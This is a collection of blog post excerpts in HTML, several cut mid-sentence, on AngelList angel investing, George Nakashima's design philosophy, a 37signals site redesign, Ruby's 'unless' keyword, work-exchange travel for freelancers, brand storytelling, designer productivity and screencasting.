      "content" : "<p>A somewhat briefer post today about a group I recently joined called <a href=\"http://j.mp/asnQLR\">AngelList</a>. The essence of what they’ve done is to create a worldwide community of angel investors, connecting them with startups looking for funding through a curated email distribution list of investors.  If your company is putting together an angel round, including one that’s partially raised but needs to be finished off, it’s a great service for connecting with investors, including the <a href=\"http://pasadenaangels.com/\">Pasadena Angels</a>.</p>\n<p>It’s not an investment fund, and it’s not the sleazy individuals that claim to be angels but are nothing more than consultants that don’t really help you raise money. They also don’t charge entrepreneurs fees for their services like some angel groups, which makes it particularly appealing to Jason Calcanis and me.</p>\n<p>AngelList was started by a serial entrepreneur, Naval Ravikant and a VC named Babak Nivi. The site has almost 400 angel investors and 267 VCs as members, including ones in Europe, Australia and Canada.  In a short span of time AngelList has looked at over 1000 deals and has helped fund more than 100 companies.</p>\n<p>Some of the AngelList investors, like myself, let you contact them directly. Through my <a href=\"http://j.mp/bfSPUX\">profile page</a>, feel free to connect with me and the Pasadena Angels, as some local companies have already done.  Along with my page, <a href=\"http://angel.co/raholt\">Bob Aholt</a> our Vice Chairman, is there as well.  All we ask before contacting us is that you’ve built a minimum viable product and learn something about your customers by putting it in front of them. After that, just send us your informative150-word elevator pitch, and we’ll look forward to talking. If you can’t get that far without some outside help, there’s an informative post on <a href=\"http://venturehacks.com/articles/idea-investors\">Ideas Investors</a> that’s worth reading.</p>\n<p>Like the Pasadena Angels’ application, the AngelList process is easy (~20 minutes) and pretty straightforward. Their process also forces you to focus on the key points for investors that I’ve mentioned in previous posts—social proof, traction, team, how do you compare to competition, elevator pitch, etc.</p>\n<p>AngelList also has a <a href=\"http://blog.angel.co\">blog</a> and sister site, <a href=\"http://venturehacks.com/\">Venture Hacks</a>, that are well worth following. For pitching the Pasadena Angels, some of the best advice on these sites includes how to create a great <a href=\"http://venturehacks.com/articles/elevator-pitch\">elevator pitch</a>  and <a href=\"http://venturehacks.com/articles/deck\">pitch deck</a>. There are also great write-ups on how <em><strong>not</strong></em> to do your pitch, including an example from Ali G (Sacha Baron Cohen) and his Ice Cream Glove. It’s worth seeing, if for no other reason than his explanation of why his company is a  $34.6 Million billion opportunity.  Better yet is the response from the VC—“This is not going to happen.”</p>\n<p><a href=\"http://www.youtube.com/watch?v=nkuOuxRD1Bc\"><img src=\"http://img.youtube.com/vi/nkuOuxRD1Bc/default.jpg\" width=\"130\" height=\"97\" border=\"0\"></a></p>"

      "content" : "<p>Less is more. Form follows function. Two phrases we hear all the time. Yet <a href=\"http://www.nakashimawoodworker.com/furniture\">furniture designer George Nakashima</a> considered them nothing but shallow slogans. In 1962, he published <a href=\"http://www.nakashimawoodworker.com/about_us/our_philosophy/1\">a manifesto</a> that explains why while also lamenting the disappearance of design excellence.</p>\n\n\n<blockquote>\n\n\t<p>In a world where manual skills are shunned we believe in them, not only in the act of producing a better product, but in the sheer joy of doing or becoming. We feel that pride in craftsmanship, of doing as perfect a job as possible, of producing something of beauty even out of nature’s discards, are all homely attributes that can be reconsidered.</p>\n\n\n\t<p>It might even be a question of regaining one’s own soul when desire and megalomania are rampant – the beauty of simple things…</p>\n\n\n\t<p>To look for clues, we can go into the past: the moss garden and tea house at Sai Ho Ji, the wonders of stone and glass at Chartres, the dipylon vase. These are all examples of excellence that can go unchallenged but also unnoticed. They are all formed inwardly with a nearly impersonal experience. Compared to our day, with its arrogance of “form-giving,” the shallowness of slogan design such as “less is more,” “machine for living,” or even “form follows function.”</p>\n\n\n\t<p>In proportion to the flood of consumer goods, we are probably at one of the lowest ebbs of design excellence that the world has seen. It requires a genuine fight to produce one well designed object of relatively permanent value. One of the difficulties is the lack of integration between the designer and the producer – the evolvement of material and method into a well conceived idea. Big city architecture has reached such a profound state of boredom that man might unwittingly destroy it in one last tragic gesture – without humor. Sentimentally again, we can look back to the thirteenth century, when almost every hinge was a museum piece. Where there was a touch of greatness in the majority of acts and conceptions.</p>\n\n\n</blockquote>\n\n\t<p>Some Nakashima designs:</p>\n\n\n\t<p><img src=\"http://s3.amazonaws.com/37assets/svn/518-conold_table.png\"></p>\n<p><a href=\"http://37signals.com/svn/posts/2704-george-nakashima-it-requires-a-genuine-fight-to-produce-one-well-designed-object-of-relatively-permanent-value\">More...</a></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=TYZomiETJJc:2qoDvP2_B18:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=TYZomiETJJc:2qoDvP2_B18:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/37signals/beMH/~4/TYZomiETJJc\" height=\"1\" width=\"1\">"

I quickly thought about it and said “I guess when you are having fun doing it.” It’s a very vague answer. For most of us doing something that is ‘fun’ for work has become a given. Getting some kind of satisfaction is the most basic requirement to do the job at all. And it should be, of course. But think only one generation back, when a job was a job and it either meant busting your back or going home hungry. Today, for many of us money comes second and fun comes first. We’ve taken the drudge out of work and added fun. </p>\n<p>My friend’s random question just reminded me once more how lucky I am and how quickly we went from “I can’t believe I’m doing this to get paid!” to “I can’t believe I’m getting paid to do this!”.</p>"

I want to share with you a few iterations and permutations I created along the way. I’ll also give a little insight into the discussions we had about each design: what we saved for the next version and what we axed because it wasn’t working.</p>\n\n\n\t<p><strong>First, a frame of reference</strong><br>\nThis was what the 37signals site looked like when I started this project. Each time Jason Fried and I talk about changing <span>ANYTHING</span> on this site he always says something like this:</p>\n\n\n<blockquote>Jamie, 37signals.com is <span>VERY IMPORTANT</span>. A ton of traffic to our app sites comes from here. We need to make sure that we aren’t abandoning clarity for cleverness. <span>CLARITY</span> is of utmost importance on this page.</blockquote>\n\n\t<p><img src=\"http://37assets.s3.amazonaws.com/svn/previous-home-short.jpg\" width=\"530\"></p>\n\n\n\t<p>Actually, now that I think about it he says that about everything I touch. Kidding aside, 37signals.com is a very important site. Careful consideration should be taken when undertaking a redesign.</p>\n\n\n\t<p><strong>The never-launched enhancement</strong><br>\nA year ago I worked on a short project to enhance parts of 37signals.com. Out of this exercise came the design below.</p>\n\n\n\t<p><img src=\"http://s3.amazonaws.com/37assets/svn/522-37s-redesign-00.png\" width=\"530\"></p>\n\n\n\t<p>I liked how this design made our products look like, well, products. <a href=\"http://basecamphq.com/?source=svn_post\">Basecamp</a>, <a href=\"http://highrisehq.com/?source=svn_post\">Highrise</a>, <a href=\"http://backpackit.com/?source=svn_post\">Backpack</a>, and <a href=\"http://campfirenow.com/?source=svn_post\">Campfire</a> are presented like shrink-wrapped packaged software. I also liked how easy it was to understand what 37signals does. We make incredibly useful software for your business. Here are our offerings.</p>\n\n\n\t<p>I can’t remember why this design never launched. It could be that at the time we had bigger fish to fry. The forms that came out of it, though, would play a part in the bigger redesign project in later months.</p>\n<p><a href=\"http://37signals.com/svn/posts/2705-behind-the-scenes-37signalscom-redesign\">More...</a></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=w4bQVvD_wEY:OZWSYsMYC-w:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=w4bQVvD_wEY:OZWSYsMYC-w:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/37signals/beMH/~4/w4bQVvD_wEY\" height=\"1\" width=\"1\">"

height=\"408\"><p>Credit:  *sean on Flickr</p></div>\n<p>This is the third article in a series on resources for the traveling freelancer.  You may find the first article <a href=\"http://freelanceswitch.com/productivity/resources-for-traveling-freelancers-1-home-base/\">here</a> and the second <a href=\"http://freelanceswitch.com/productivity/resources-for-traveling-freelancers-2-free-accommodation/\">here</a>.</p>\n<p>This article is about exchanging work for room and board on the road, which is good for those who want to take it easy with their work or even for writers looking for new material.  There are farm owners, hostel and hotel owners, and home owners who are part of global networks offering room and board to “volunteer” workers (there are also country-specific sites and Australia and New Zealand seem to be very popular destinations).  Arrangements vary widely and the volunteer must do good research to find the right agreement and host.<span></span></p>\n<h3><strong>WWOOFing</strong></h3>\n<p><a href=\"http://www.wwoof.org/\">WWOOF</a>, World-Wide Opportunities on Organic Farms, is an international group of organic farm owners who offer room and board to volunteers who spend up to five hours per day helping out on the farms.  The type of work varies from farm to farm and could include anything from composting to wine making.  WWOOFing can be good for writers who want to work in the countryside – on their writing and on their farming muscles.  This isn’t something I’ve tried but I learned about it from other travelers, all of whom had pleasant and not so pleasant experiences to share.</p>\n<p>Farmers may host one or multiple volunteers.  Good experiences involve friendly hosts who share stories and a lot of knowledge and bad experiences could involve hosts who are simply looking for long-term free labor.  Hosts have also complained about volunteers who don’t do much work at all.</p>\n<h4><strong>Why Do It</strong></h4>\n<p>•    Healthy lifestyle – you’ll eat fresh organic food and get your workout.<br>\n•    City dwellers might find the peace of mind they needed to de-stress.<br>\n•    You can work on your language skills if you choose a farm abroad.<br>\n•    Being in a different environment can greatly help creativity.<br>\n•    You might spend a lot of time alone.</p>\n<h4><strong>Why Not Do It</strong></h4>\n<p>•    You might spend a lot of time alone (too much of one thing can be bad).<br>\n•    You might have to pay a membership fee so you can provide free labor for someone.<br>\n•    Internet might not be available or it might be slow or limited.<br>\n•    You might share a room with several people, which might be especially uncomfortable if there are personality clashes.<br>\n•    You might be too tired to get much freelancing work done.<br>\n•    Working on a farm is unpredictable and you might be asked to work longer than what you’d agreed on.</p>\n<h4><strong>Tips</strong></h4>\n<p>•    Be clear with your potential host about your expectations on the farm and about your freelance work.  That farm in Tuscany might seem so romantic but if your host has reservations about your freelancing and the time you require for yourself, the experience will be unpleasant for both.<br>\n•    Find out what resources are available for you to work before you commit to a position.  Some WWOOFers have reported having to pay their host for limited internet and others reported having no internet at all.<br>\n•    Consider starting with a short agreement – a couple of weeks might be a good time to see if you like the lifestyle.<br>\n•    Be clear about what’s going to be happening at your host farm: find out what kind of work you’ll be doing, what hours you will be expected to work, with whom you will be living etc.</p>\n<p>•    Ask for references.</p>\n<p>•    Make sure to have health insurance, which most likely you will have to purchase yourself.<br>\n•    Have a back up plan and get some information on neighboring farms, transportation and other local resources.</p>\n<h3><strong>Additional Places To Exchange Work for Accommodation</strong></h3>\n<p>There are organizations that function like WWOOF that offer opportunities in additional types of settings and for these the pro’s, con’s and tips for WWOOFing apply.  Though many of these sites are generally geared towards students and young people who travel on a budget, there are people of all ages using them and one must just look around to find a good match.</p>\n<p><a href=\"http://www.helpx.net/\">HelpX</a> is “an online listing of host organic farms, non-organic farms, farmstays, homestays, ranches, lodges, B&amp;Bs, backpackers hostels and even sailing boats who invite volunteer helpers to stay with them short-term in exchange for food and accommodation.”  Free membership allows basic access to host information and paid membership (20€ or US$27) allows full access.</p>\n<p><a href=\"http://www.helpexchange.net/\">Helpexchange.net</a> is much like HelpX but the site design and navigation are basic.</p>\n<p><a href=\"http://www.workaway.info/\">Workaway.info</a> “is a site set up to promote fair work exchange between budget travelers, language learners or culture seekers and families, individuals or organizations who are looking for help with a range of varied and interesting activities.”</p>\n<h4><strong>Why Do It</strong></h4>\n<ul>\n<li>Since you’ll most likely have an agreement with a set time frame you’ll know you have guaranteed and fixed housing for that period of time</li>\n<li>It also may be an additional source of income</li>\n</ul>\n<h4><strong>Why Not Do It</strong></h4>\n<ul>\n<li>If things don’t go well with your employer you might end up having to look for accommodation last minute and that can be a big hassle</li>\n<li>You might end up working too much at your host’s and not enough on your freelance assignment</li>\n</ul>\n<h4><strong>Tips</strong></h4>\n<p>Because you’ll spend quite a bit of time working and trying to see the place where you’re living, this option is probably best if you intend on staying in one place for an extended period of time.</p>\n<p>There you have the third part of this series of resources for the traveling freelancer.  In the fourth part I’ll list communications options and other solutions to everyday matters.</p>\n<p><em>If you have experience with work exchange please do share!</em></p>\n<p><em>Photo credit: <a href=\"http://www.flickr.com/photos/seanj/\">*sean</a> on Flickr</em></p><p><iframe

It is important to realize that people aren't just purchasing your product, they are purchasing an experience and the story behind the product. Everyone wants to hear a story and to be part of an experience. The most important thing a brand can do to promote their product or service is to make it tell a story. A great story adds value and personality to a brand and its products or services. It makes the product more approachable and friendly.</p>\n<p><strong>If your brand can present a unique story or make the customer feel like they are a part of something, you'll win big time.</strong></p>\n<div><a href=\"http://www.flickr.com/photos/sparktography/377051243/\"><img alt=\"\" src=\"http://velorastudios.com/blogimg/telling-stories.jpg\"></a></div>\n<span>Photo by: <a href=\"http://www.flickr.com/photos/stuckincustoms/\">Stuck in Customs</a></span><br>\n</div>\n<h3>Sell Customers an Experience, Don’t Sell Features</h3>\n<p>We are all storytellers, but we listen to stories even more. We are surrounded by stories. We love hearing them, whether they come from a book, a friend, a movie, a game, a song or a brand. Stories have the power to elicit strong feelings and emotions. When you present the story behind your product to the customer and then invite them to become a part of that experience, they will want to purchase it to have that experience themselves. In this situation they are not buying your product for its features or price, but for the experience it gives them and the story that it tells. It doesn’t matter if brand &quot;XYZ&quot; has one more feature than you or is $10 cheaper, it’s the experience that matters.</p>\n<h2>How to Start Telling Your Brand's Story More Effectively </h2>\n<br>\n<p>Storytelling shows the human side of your brand that customers can connect with. The copy written about a brand isn't the only thing that tells its story. The web design of the site selling the product, the look and feel of the product; how the product functions, whether it is a neat AJAX effect in a web app or the way a small hinge on a physical product moves. These things are all part of conveying the character of the story. A great story will immerse your audience, and keep them on the edge of their seats waiting to hear what will happen next.</p>\n<h3>1. Brand Identity Design</h3>\n<p>A brand’s logo design and color scheme are important in conveying the image that your brand represents. Create a design and story that your target audience can relate to. A large part of a brand’s personality is conveyed through the company’s identity design. The look of a brand can tell the consumer if it is something bold, modern, sleek, and powerful or something friendly, natural, cute and playful. Check out another one of our posts to see how important <a href=\"http://www.velorastudios.com/_blog/Velora_Studios_Blog/post/Lessons-in-Design-from-Storytellers/\">lessons from storytellers can be applied in design</a> to aid in tellings a brand's story.</p>\n<div><img alt=\"velora\" src=\"http://velorastudios.com/blogimg/velora-identity.jpg\"></div>\n<span>Picture: The Velora Studios Logo</span>\n<h3>2. User Experience</h3>\n<p>How your product or service is designed to function is another big piece of your brand’s story. Whether your brand is selling a physical product or software, design for user experience is equally important. Companies like Apple go the extra mile to create a great user experience with their products. They want users to feel great and immersed in the experience of using an Apple product. Even opening the box is an exciting experience because of Apple’s carefully thought out, elegantly designed product packaging.</p>\n<p>A brand's story should connect with customers on an emotional level and create a deeper involvement. It is important to think beyond if a product is accomplishing its task and if a product looks nice. Even if both of those things are true, the most important quality to think about and implement is making the product enjoyable to use.</p>\n<div><img alt=\"\" src=\"http://velorastudios.com/blogimg/ipod-packaging.jpg\"></div>\n<span>Photo: Apple iPod package design from <a href=\"http://www.thedieline.com/blog/2010/9/1/new-ipod-family-packaging.html\">thedieline.com</a></span>\n<h3>3. Customer Service and Positioning</h3>\n<p>The last major piece that makes up a brand’s story is how the brand interacts with and responds to their customers, and how a brand positions itself to the public. Listen to what your customers are saying to you and respond showing them that you care. Encourage customers and potential customers to interact with your brand. With the shift of consumer expectations that came with the real-time social web this is even more important. Luckily, now it is also easier to see what your customers are saying about your brand.</p>\n<p>Zappos’ customer service is a great example. Zappos makes the purchasing experience as smooth and friendly as possible encouraging customers to call them about almost everything. Call center employees don’t use scripts or have call time limits. The culture that Zappos has created within its workplace is reflected on its customer service and its story is told.</p>\n<div><img alt=\"\" src=\"http://velorastudios.com/blogimg/tonyhsieh.jpg\"></div>\n<span>Photo: Tony Hsieh, Zappos CEO from <a href=\"http://whiteboardjournal.com/news/general-interest/an-interview-of-delivering-happiness-author-tony-hsieh.html/\">Whiteboard Journal</a></span>\n<h3>Summing it Up</h3>\n<p>The best brands are not using bland sales copy and data to promote their products. They are not adding unecessary features or making sure they have the lowest price. The best brands are telling stories and inviting their audience to become a part of them. The story that your brand tells can make all the difference.</p>\n<div>\n<p><strong>Endnote:</strong> Start telling your story today and think about how it will appear to others. Show personality in your brand does and give your audience something to latch onto.\nHave you heard an amazing story recently? Have you become enthralled by a product because of the story and experience it provided you? Leave a comment and let us know.\n</p>\n</div>\n<div>\n<p>Advertisement:</p>\n<a href=\"http://www.appsumo.com/?r=7eHl\"><img alt=\"\" src=\"http://velorastudios.com/blogimg/appsumo-new.jpg\"></a> </div>"

      "content" : "<div>\n<p>Becoming more productive can help you get where you want to be with your business, but the answer to what you can do to become more productive usually isn't staring you in the face. We often get used to our workflow and make a habit of it. It takes effort to identify where bottlenecks are and to take action on improving your process to become more productive as a designer or business owner.</p>\n<p>There are many different little things you can do to become more productive, ranging from meditation to exercising to learning how to speed read. We have outlined what we think are the five most important techniques that will have the greatest impact on your productivity as a designer or business owner. Following, reviewing and conditioning yourself to these five strategies will help you to optimize your workflow so that you can get more accomplished each day.</p>\n<div><a href=\"http://www.flickr.com/photos/sparktography/377051243/\" title=\"POTD 02/1/07 - Pulse of the city by sparktography, on Flickr\"><img width=\"500\" height=\"333\" alt=\"POTD 02/1/07 - Pulse of the city\" src=\"http://farm1.static.flickr.com/111/377051243_9bd0da55af.jpg\"></a></div>\n<span>Photo by: <a href=\"http://www.flickr.com/photos/sparktography/\">sparktography</a></span><br>\n</div>\n<h3>1. Automate:</h3>\n<p>Don't spend time working on things that an application do on it's own. With computers and technology advancing so quickly there are more things that can be automated everyday. A few examples are simple repetitive tasks like file renaming, batch image cropping or resizing, hard drive backups, website backups, sending out reminders to clients and more.</p>\n<div><img alt=\"\" src=\"http://velorastudios.com/blogimg/automate.jpg\"></div>\n<span>Screenshot: Automator for Mac</span>\n<p>You can get started with this by using tools like Automator for Mac, the actions palette in Adobe Photoshop, and <a href=\"http://app.jbbres.com/actions/\" rel=\"nofollow\">Actions</a> for Windows. Next time you are doing a simple task like this, think to yourself, do I really need to be doing this or can my computer do it for me?</p>\n<h3>2. Optimize Your Equipment:</h3>\n<p>Having the proper equipment is important for being productive as a designer and can make a huge difference in how much work you get finished each day. For example, if you do a lot of masking and drawing it probably makes sense to invest in a tablet which would allow you to complete tasks like these many times faster than with a mouse. Updating an outdated computer or adding a second or third display to your workflow can help tremendously too.</p>\n<div><img alt=\"\" src=\"http://velorastudios.com/blogimg/monitors.jpg\"></div>\n<span>Photo by: <a href=\"http://www.flickr.com/photos/damnednice/\">DamnedNice</a></span>\n<p>Upgrading your outdated equipment may seem expensive and not ideal, but if you can be two or three times more productive by doing so, then it is well worth it. You almost can&#39;t afford to not upgrade if you want to be able to grow your business beyond it&#39;s current state. When you are optimizing your equipment to remove large bottlenecks you are making a wise purchase that will have a large return on investment. The final benefit that an optimized work area and equipment provide is they can help you to have more fun. If you are having more fun you can be more relaxed and will want to spend more time working since you enjoy it more.</p>\n<h3>3. Get Things Done:</h3>\n<p>This may seem like a really obvious one, but many people don't spend enough time actually getting things done. Many times designers and business owners struggle to just complete the items that come up during the day and end up not really progressing on the tasks they need to work on to move forward. </p>\n<p>Look at what you have been getting done and do not just what comes up during the day, but make sure you do something that advances you or makes your business grow each day.</p>\n<p><a href=\"http://en.wikipedia.org/wiki/Getting_Things_Done\">Getting Things Done</a> by David Allen is a great method and book for any freelance designer, developer or business owner. The principle is that a person should get tasks out of the mind by recording them somewhere. Once you have done that, the mind can stop thinking about everything that needs to be done and actually focus on doing it.</p>\n<div><img alt=\"\" src=\"http://velorastudios.com/blogimg/things.jpg\"></div>\n<span>Screenshot: <a href=\"http://www.culturedcode.com\" rel=\"nofollow\">Things</a></span>\n<p>Organize what you need to do for the day in a to-do application or on paper. Make sure that you have separate list of only the tasks that you need to complete for the day so that you focus on only what you need to do at the moment. To-do lists help to get everything out of our heads instead of trying to remember what can sometimes grow to be hundreds of different tasks. Finding what you enjoy and what fits your style best, whether it's an app or a moleskin notebook, is important and will help you stick to the process and make it part of your routine. I like using an app called \"Things\" by cultured code. It fits the GTD workflow well, I enjoy the interface and it has mobile apps so I can always write something down that I will need to do, no matter where I am when I think of it. </p>\n<h3>4. Know Where Your Time is Going:</h3>\n<p>One of the most common productivity issues is when designers don't realize how much of their time they are spending on things that they shouldn't be. There are a couple easy things that you can do to find out where your time is really being spent.</p>\n<p>Rescuetime is a great web app that will track everything you do on your computer while you work. It then shows reports and graphs so you can see how much of your time is spent being productive and how much you are distracted. It does a good job of recognizing what applications or websites may be distracting based on what you input as your occupation and it can be further customized manually.</p>\n<div><img alt=\"\" src=\"http://velorastudios.com/blogimg/rescuetime.jpg\"></div>\n<span>Screenshot: <a href=\"http://www.rescuetime.com\" rel=\"nofollow\">Rescuetime</a></span>\n<p>There is another similar application called Slife automatically tracks where your time is spent on different programs and webpages. Like Rescuetime you can set goals for yourself within the app. It exists now as a <a href=\"http://www.slifeweb.com/\" rel=\"nofollow\">web app</a>, but there is also an open source <a href=\"http://www.slifelabs.com/development\" rel=\"nofollow\">desktop client</a> available.</p>\n<p>One final app, a desktop app called <a href=\"http://getconcentrating.com/\" rel=\"nofollow\">Concentrate</a> will help you stay on task by preventing you from visiting certain distracting websites and applications. It will even set your instant messenger status to away to avoid incoming distractions.</p>\n<p>Using apps like these can be very useful in letting you see where you are spending your time each day and then take action to really focus on what you need to. Oftentimes you may be surprised in how much time you spend on things you did not expect, like email, youtube or twitter.</p>\n<h3>5. Review What you Can Cut Out or Outsource:</h3>\n<p>Look at the things that aren't important and can be cut out of your daily workflow. Find where you can cut out, automate and outsource so that you can spend more time on what is important in your business, design. After you focus on seeing what you are actually doing with your hours each day it will become more apparent what can be cutout and isn't really getting you anywhere.</p>\n<div><img alt=\"\" src=\"http://velorastudios.com/blogimg/cutout.jpg\"></div>\n<span>Photo by: Velora Studios</span>\n<p>Outsourcing is another complex topic on it's own, but today it is more common than ever for freelancers, designers and small businesses to outsource some of their work part time so that they have more time to focus on the things they want to get done. Invoicing, email, support and research are just a few examples of things that a designer could outsource to become more productive and spend more time on their skills and what they enjoy, design.</p>\n<div>\n<p><strong>Endnote:</strong> Almost everyone will have at least a few things they can adjust to become more productive. Think about what these things are for you and get started today. Each day continue to focus on making those changes and you will gradually adapt to your new more productive workflow. <br>\nDo you have a productivity tip to share?

Case in point: <code>unless</code>.</p>\n\n\n\t<p>The <code>unless</code> keyword is just <code>if</code> in reverse. It’s a conditional statement that executes only if the condition is false, instead of true. This lets you write little gems like this:</p>\n\n\n<pre><code>  i += 1 unless i &gt; 10\n\n  unless person.present?\n    puts &quot;There&#39;s no such person&quot; \n  end\n</code></pre>\n\n\t<p>However, as with anything that gives you a little power, it can be abused. The following abomination is but a sample:</p>\n\n\n<pre><code>  unless !person.present? &amp;&amp; !company.present?\n    puts &quot;do you even know what you&#39;re doing?&quot; \n  else\n    puts &quot;and now we&#39;re really confused&quot; \n  end\n</code></pre>\n\n\t<p>I do not doubt that there are people out there who can decipher the logic above without breaking a sweat. But for most folks, combining negations, multiple conditions, and (gasp!) else clauses with an “unless” statement makes for challenging reading. It also makes it far too easy to introduce bugs into the logic.</p>\n\n\n\t<p>Some rules of thumb when using <code>unless</code>:</p>\n\n\n\t<ol>\n\t<li>Avoid using more than a single logical condition. <code>unless foo?</code> is fine. <code>unless foo? &amp;&amp; bar?</code> is harder to parse.</li>\n\t\t<li>Avoid negation. “Unless” is already negative. Piling more on only makes it worse.</li>\n\t\t<li>Never, ever, ever use an <code>else</code> clause with an <code>unless</code> statement.</li>\n\t</ol>\n\n\n\t<p>Not only will others thank you when they have to read your code, you’ll thank yourself when you have to return to that code a month or two down the road.</p><div>\n<a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=zCHrpPXTEPU:olHz0SSvaYw:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=zCHrpPXTEPU:olHz0SSvaYw:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/37signals/beMH/~4/zCHrpPXTEPU\" height=\"1\" width=\"1\">"

I loved the delivery, but I disagree with the conclusion.</p>\n\n<p>I originally never wanted to be a programmer exactly because I thought the only type of programmers that existed where the kind that Bob talked about: The engineers with the proud professional practices that never wavered under pressure.</p>\n\n<p>While I deeply respected that stature, it just never felt like a place that I belonged. I didn't identify with the engineering man or the seriousness of the efforts he pursued. Before I discovered Ruby, I felt in large parts that I was just faking my way along in this world. Here at a brief time for rent.</p>\n\n<p>But that all changed when I found Ruby and a community consisting as much of artists as engineers. People waxing lyrically about beautiful code and its sensibilities. People willing to trade the hard scientific measurements such as memory footprint and runtime speed for something so ephemeral as programmer happiness.</p>\n\n<p>That's where I found an identity that I could finally relate to directly. That's when I finally got really passionate about what I do for a living and started to blossom my own participation.</p>\n\n<p>Now the wonderful thing about this new age of programming is that we need and prosper from both types of programmers. I believe Ruby is such a fantastic community and platform exactly because both types are coming together and sharing with each other. The bazaar is so much richer when the cultural backgrounds of the participants are diverse.</p>\n\n<p>So while I love the idea of Bob's green wristband that reminds him always to do test-first development and his own personal professional oath, that level of adherence has never worked for me. I never had the discipline it takes to fulfill such a lofty goal of professionalism.</p>\n\n<p>Now Bob may think that there's no place for people like me in programming (I sure know plenty of people who do!), I obviously think that would be a mistake. Not just because I've grown rather fond of what I do, but because I've seen so many other unprofessionals just like me come in and add those delicious twists that can really change things.</p>\n\n<p>We aren't perfect. We often swear, act unresponsively, and can certainly be characterized as unprofessional a lot of the time. But I think that together with professionals like Bob, we stand a good chance leaving the world of programming in a better condition than we found it.</p>"

It’s a shame to see how many websites out there lack a beautiful looking screencast, as this can make products look <em>a lot</em> more attractive to potential customers.</p><p>What most hobby screencasters don’t know, is that screencasting is not simply the act of <em>sitting down and recording the screen;</em> simple screen recording was something we did four to five years ago. Screencasts have a long history, starting from “I just record my screen” to the fancy product demos you see today. Nowadays, a screencast is almost necessary for start-ups and new products, especially in the tech business.</p><p>My career as a screencaster started a couple of years ago. By that time, I was already blogging; sitting in front of Ableton Live (which I found to be a very original new workflow), I asked myself: what would be the best way to show others what I’m doing? The answer was clear: to record my screen.</p><p>That same night, I started using Snapz Pro X. <a href=\"http://www.youtube.com/watch?v=QZbxIxXEXVs\">My English was terrible</a> and it felt awkward to record this thing  —  then to re-record it about ten times. Since then I have recorded hundreds of screencasts, including for <a title=\"Mac OS X Screencasts\" href=\"http://macosxscreencasts.com/\">Mac OS X Screencasts</a>. Having gained a lot of experience, it’s now time to share this experience with others.</p><h3>How <em>Not</em> To Do a Screencast</h3><p>In the early days of screencasting, there were a lot of YouTube videos which now look like screencasting “dinosaurs.” This was to be expected then, but there are still people making the same terrible mistakes we all made in the early days.</p><h4>Handheld Cameras</h4><p>We probably all know that scenario; we’ve found a new function that apparently nobody uses in a program, and are so excited that we instantly want to share that idea on YouTube. It’s easy to grab a video camera or mobile phone and just point it at the computer screen, right? No. Never ever do that, as the <a href=\"http://www.youtube.com/watch?v=8W6BWkRNEig&amp;feature=player_embedded\">videos will look terrible</a>!</p><p>On the other hand, if the video shows something really, really extraordinary, people will watch it anyway. Content is king! If that video ends up on another website that showcases a product or service, it’s obvious that someone should invest precious money in screencasting software.</p><h4>Facial Cameras</h4><p>We have seen this a lot of times around the Web: screencasts with a smaller rectangular screen showing the person recording the screencast. Most of the time this screen is put somewhere in the video, and is <em>always</em> on. Even famous people like <a title=\"TextExpander 3 by Merlin Mann\" href=\"http://www.kungfugrippe.com/post/444164120/check-out-textexpanders-new-fill-functionality\">Merlin Mann</a> are doing it. Merlin is great, by the way, although he’s no professional screencaster; all he intended to do was show his <em>cool new workflow</em> in TextExpander, which is great. Recording with <em>built-in</em> cameras is great too, but as I will describe later, <strong>use these functions wisely</strong>.</p><p><iframe src=\"http://player.vimeo.com/video/10125313\" width=\"500\" height=\"312\" frameborder=\"0\"></iframe></p><p> Consider the following:</p><ul><li>Is it necessary for a face to be there all the time?</li><li>Does the audience really need to see a face to follow the screencast?</li><li>Will the face distract people from watching the screencast?</li></ul><p>I agree that for introduction purposes, it’s a good idea to show someone on a built-in or external webcam; but as soon as we move to the main content, it’s a good idea to fade that video out. In my latest screencasts, I do exactly that: at the intro my facial camera is on while I tell my audience what they are about to see  —    and then when I get to the first section, I fade this video out.</p><p>Here’s a recommendation: do a big close-up as your introduction, centered on the screen. Then say something like, “Hi, my name is Andreas and today I’m showing you Whatever™ product by Some, Inc. Whatever™ is great, and I love it; you will love it too, and here’s why.” Right after “…and here’s why,” either fade the video out or decrease the size of the video while moving it to the lower right/left corner. Then, leave that video a couple more seconds on screen before fading it out completely.</p><p><iframe title=\"YouTube video player\" width=\"500\" height=\"408\" src=\"http://www.youtube.com/embed/Bg22ASHYpE0\" frameborder=\"0\"></iframe></p><h4>Distractions During Screencasting</h4><p>When I started recording screencasts, this was one of the hardest things to learn: <strong>leave the mouse pointer wherever it is on the screen</strong> and don’t use it as an extension of your <em>hand</em>. If you own good recording or production software, callouts or zooms and pans are better tools to emphasize a particular thing on screen. It’s not necessary to move the mouse while describing something. Also, when you are editing the screencast later on, it’s much easier to make your edits when the mouse stays still so there is no distracting mouse movement between shots, or mouse jump at a jump cut.</p><p>On the other hand, the mouse pointer <em>has</em> to be used at times as it’s the only thing people can focus on to follow detailed instructions. Just using keyboard shortcuts is a bad idea. I would recommend on first showing, that you display the menu entry and point out that there’s a keyboard shortcut. On the second showing, use the shortcut (please do tell the listeners prior to execution, otherwise they won’t be able to recognize what you just did).</p><h4>Don’t Annoy People</h4><p>A crucial part of a good screencast is <em>entertainment,</em> a fact that many people —  especially beginners 